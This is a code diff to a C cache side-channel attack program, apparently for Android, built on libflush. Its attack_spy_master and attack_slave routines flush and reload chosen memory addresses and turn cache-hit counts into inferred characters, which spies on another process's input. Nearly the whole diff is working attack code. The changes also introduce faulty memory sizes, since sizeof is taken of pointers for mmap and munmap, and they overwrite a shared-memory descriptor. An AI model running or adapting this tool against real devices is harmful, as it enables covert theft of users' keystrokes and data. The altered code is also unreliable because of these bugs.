@@ -32,6 +32,7 @@
 #endif
 
 static int shared_data_shm_fd = 0;
+static int shared_data_update_shm_fd = 0;
 static int shared_addresses_hits_shm_fd = 0;
 #endif
 
@@ -58,8 +59,15 @@ typedef struct shared_data_s
   lock_t lock;
 } shared_data_t;
 
+typedef struct shared_data_update_s
+{
+  bool isUpdated;
+  lock_t lock;
+} shared_data_update_t;
+
 static shared_data_t *shared_data = NULL;
 static uint64_t *shared_addresses_hits = NULL;
+static shared_data_update_t *shared_data_update = NULL;
 static Matrix *mtr = NULL;
 
 #ifdef WITH_THREADS
@@ -265,6 +273,23 @@ int main(int argc, char *argv[])
     return -1;
   }
 
+  shared_data_update_shm_fd = open("/" ASHMEM_NAME_DEF, O_RDWR);
+  if (shared_data_update_shm_fd < 0)
+  {
+    fprintf(stderr, "Error: Could not create shared memory.\n");
+    return -1;
+  }
+  ioctl(shared_data_update_shm_fd, ASHMEM_SET_NAME, "shared_data_update");
+  ioctl(shared_data_update_shm_fd, ASHMEM_SET_SIZE, sizeof(shared_data_update));
+
+  shared_data_update = mmap(NULL, sizeof(shared_data_update), PROT_READ | PROT_WRITE,
+                            MAP_SHARED, shared_data_update_shm_fd, 0);
+  if (shared_data_update == MAP_FAILED)
+  {
+    fprintf(stderr, "Error: Could not map shared memory.\n");
+    return -1;
+  }
+
   int ac = 1 + (int)readAddressCount(matrixfile);
   if (ac == 0)
   {
@@ -282,7 +307,7 @@ int main(int argc, char *argv[])
   ioctl(shared_addresses_hits_shm_fd, ASHMEM_SET_SIZE, sizeof(uint64_t) * ac);
 
   shared_addresses_hits =
-      mmap(NULL, sizeof(shared_data), PROT_READ | PROT_WRITE, MAP_SHARED,
+      mmap(NULL, sizeof(shared_addresses_hits), PROT_READ | PROT_WRITE, MAP_SHARED,
            shared_addresses_hits_shm_fd, 0);
   if (shared_addresses_hits == MAP_FAILED)
   {
@@ -294,6 +319,14 @@ int main(int argc, char *argv[])
   shared_data_shm_fd =
       shmget(IPC_PRIVATE, sizeof(shared_data_t), IPC_CREAT | SHM_R | SHM_W);
   if (shared_data_shm_fd == -1)
+  {
+    fprintf(stderr, "Error: Could not get shared memory segment.\n");
+    return -1;
+  }
+
+  shared_data_update_shm_fd =
+      shmget(IPC_PRIVATE, sizeof(shared_data_update_t), IPC_CREAT | SHM_R | SHM_W);
+  if (shared_data_update_shm_fd == -1)
   {
     fprintf(stderr, "Error: Could not get shared memory segment.\n");
     return -1;
@@ -383,7 +416,7 @@ int main(int argc, char *argv[])
       fprintf(stderr, "Error: Can not init the Matrix");
   }
   readConfigFile(matrixfile, mtr);
-  printMatrix(stderr, mtr); 
+  // printMatrix(stderr, mtr);
 
   /* Bind to CPU */
   size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
@@ -421,6 +454,7 @@ int main(int argc, char *argv[])
         tal_init(&(shared_data->lock), &attr);
 #else
         tal_init(&(shared_data->lock), NULL);
+        tal_init(&(shared_data_update->lock), NULL);
 #endif
 
         fprintf(stdout, "[x] Slave process %d with pid %d\n", (unsigned int)i,
@@ -519,9 +553,19 @@ int main(int argc, char *argv[])
     close(shared_data_shm_fd);
   }
 
+  if (shared_data_update != NULL)
+  {
+    munmap(shared_data_update, sizeof(shared_data_update));
+  }
+
+  if (shared_data_update_shm_fd != -1)
+  {
+    close(shared_data_update_shm_fd);
+  }
+
   if (shared_addresses_hits != NULL)
   {
-    munmap(shared_addresses_hits, sizeof(uint64_t) * ac);
+    munmap(shared_addresses_hits, sizeof(shared_addresses_hits));
   }
 
   if (shared_addresses_hits_shm_fd != -1)
@@ -597,22 +641,26 @@ static void attack_spy_master(Matrix *mtr, size_t offset,
       (uint64_t *)malloc(sizeof(uint64_t) * mtr->ac);
   do
   {
-    for (unsigned int i = 0; i < mtr->ac; ++i)
-    {
-      shared_data->current_offset = mtr->addresses[i] - offset;
-      // shared_addresses_hits[0] = i + 1;
-      // shared_addresses_hits[i + 1] = 0;
-      usleep(offset_update_time);
-      // printf("Max value of address %8p is %" PRIu64 "\n",
-      // (void*)mtr->addresses[i], shared_addresses_hits[i+1]);
-    }
+    // for (unsigned int i = 0; i < mtr->ac; ++i)
+    // {
+    shared_data->current_offset = mtr->addresses[0] - offset;
+    // shared_addresses_hits[0] = i + 1;
+    // shared_addresses_hits[i + 1] = 0;
+    // usleep(offset_update_time);
+    // printf("Max value of address %8p is %" PRIu64 "\n",
+    // (void*)mtr->addresses[i], shared_addresses_hits[i+1]);
+    // }
+
+    tal_lock(&(shared_data_update->lock));
 
     for (size_t i = 0; i < mtr->ac; i++)
     {
-      printf("Max value of address %8p is %" PRIu64 "\n",
-             (void *)mtr->addresses[i], shared_addresses_hits[i + 1]);
+      // printf("Max value of address %8p is %" PRIu64 "\n",
+      //        (void *)mtr->addresses[i], shared_addresses_hits[i + 1]);
       shared_addresses_hits_record[i] = shared_addresses_hits[i + 1];
     }
+
+    tal_unlock(&(shared_data_update->lock));
 
     // 分析数据得到结果
     printResult(mtr, shared_addresses_hits_record);
@@ -633,42 +681,52 @@ static void attack_slave(libflush_session_t *libflush_session, uint8_t *m,
     while (current_offset == shared_data->current_offset)
     {
       tal_lock(&(shared_data->lock));
-      uint64_t* hit_counter = (uint64_t*)malloc(sizeof(uint64_t)*mtr->ac);
+      uint64_t *hit_counter = (uint64_t *)malloc(sizeof(uint64_t) * mtr->ac);
 
-      for(size_t i=0;i<mtr->ac;++i){
+      for (size_t i = 0; i < mtr->ac; ++i)
+      {
         hit_counter[i] = 0;
       }
 
       int pause = 0;
-      for (unsigned int i = 0; i < number_of_tests; i++) {
-        for(size_t j = 0; j < mtr->ac; j++){
+
+      tal_lock(&(shared_data_update->lock));
+
+      for (unsigned int i = 0; i < number_of_tests; i++)
+      {
+        for (size_t j = 0; j < mtr->ac; j++)
+        {
           // uint64_t count = libflush_reload_address_and_flush(libflush_session, m + current_offset);
           uint64_t count = libflush_reload_address_and_flush(libflush_session, m + mtr->addresses[j] - offset);
-          if (count < threshold) {
-            if (pause > 1) {
+          if (count < threshold)
+          {
+            if (pause > 1)
+            {
               hit_counter[j]++;
             }
             pause = 0;
-          } else {
+          }
+          else
+          {
             pause++;
           }
 
-          if (hit_counter[j] > shared_addresses_hits[j+1]){
-            shared_addresses_hits[j+1] = hit_counter[j];
-          }
+          // if (hit_counter[j] > shared_addresses_hits[j+1]){
+          shared_addresses_hits[j + 1] = hit_counter[j];
+          // }
 
-          if (show_timing == true) {
-            struct timespec time = {0,0};
+          if (show_timing == true)
+          {
+            struct timespec time = {0, 0};
             clock_gettime(CLOCK_MONOTONIC, &time);
-            double measured_time = ((double)time.tv_sec + 1.0e-9*time.tv_nsec);
+            double measured_time = ((double)time.tv_sec + 1.0e-9 * time.tv_nsec);
 
-            fprintf(stdout, "%.5f: %8p - %" PRIu64 "\n", measured_time, (void*)
-                (mtr->addresses[j]), count);
+            fprintf(stdout, "%.5f: %8p - %" PRIu64 "\n", measured_time, (void *)(mtr->addresses[j]), count);
             fflush(stdout);
 
-            if (logfile != NULL) {
-              fprintf(logfile, "%.f,%p,%" PRIu64 "\n", measured_time, (void*)
-                  (mtr->addresses[j]), count);
+            if (logfile != NULL)
+            {
+              fprintf(logfile, "%.f,%p,%" PRIu64 "\n", measured_time, (void *)(mtr->addresses[j]), count);
             }
           }
         }
@@ -679,22 +737,24 @@ static void attack_slave(libflush_session_t *libflush_session, uint8_t *m,
         }
       }
 
-      for (size_t j = 0; j < mtr->ac; j++)
-      {
-          if (hit_counter[j] > 0 && show_timing == false)
-          {
-            fprintf(stdout, "%8p - %" PRIu64 "\n",
-                    (void *)(mtr->addresses[j]), shared_addresses_hits[j+1]);
-            fflush(stdout);
+      tal_unlock(&(shared_data_update->lock));
 
-            if (logfile != NULL)
-            {
-              fprintf(logfile, "%8p - %" PRIu64 "\n",
-                      (void *)(mtr->addresses[j]), shared_addresses_hits[j+1]);
-            }
-          }
-        
-      }
+      // for (size_t j = 0; j < mtr->ac; j++)
+      // {
+      //     if (hit_counter[j] > 0 && show_timing == false)
+      //     {
+      //       fprintf(stdout, "%8p - %" PRIu64 "\n",
+      //               (void *)(mtr->addresses[j]), shared_addresses_hits[j+1]);
+      //       fflush(stdout);
+
+      //       if (logfile != NULL)
+      //       {
+      //         fprintf(logfile, "%8p - %" PRIu64 "\n",
+      //                 (void *)(mtr->addresses[j]), shared_addresses_hits[j+1]);
+      //       }
+      //     }
+
+      // }
 
       tal_unlock(&(shared_data->lock));
     }
@@ -707,14 +767,15 @@ static void printResult(Matrix *mtr, uint64_t *shared_addresses_hits)
 {
   int *chars = NULL;
   int cc = getCharacters(mtr, shared_addresses_hits, &chars);
-  if (cc == 0)
+  if (cc == 0 || (cc == 1 && chars[0] == (int)mtr->cc - 1))
   {
-    fprintf(stdout, "None\n");
+    // fprintf(stdout, "None\n");
     return;
   }
   for (int i = 0; i < cc; i++)
   {
-    fprintf(stdout, "%s\t", mtr->characters[chars[i]]);
+    if (chars[i] != (int)mtr->cc - 1)
+      fprintf(stdout, "%s ", mtr->characters[chars[i]]);
   }
   printf("\n");
 }
